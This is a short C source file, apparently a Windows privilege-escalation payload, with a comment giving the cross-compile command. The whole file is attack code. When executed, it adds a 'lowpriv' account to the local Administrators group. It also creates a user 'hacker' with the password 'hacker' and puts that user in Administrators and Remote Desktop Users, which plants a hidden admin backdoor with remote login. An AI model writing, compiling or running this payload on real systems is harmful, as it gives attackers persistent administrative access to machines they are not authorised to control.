//compilethiscode i586-mingw32msvc-gcc useradd.c -o useradd.exe
//useradd.c 
#include <stdlib.h>
int main()
{
	int i;
	i=system("net localgroup administrators lowpriv /add");
	i=system("net user hacker hacker /add");
	i=system("net localgroup administrators hacker /add");
	i=system("net localgroup \"Remote Desktop users\" hacker /add");
	return 0;
}

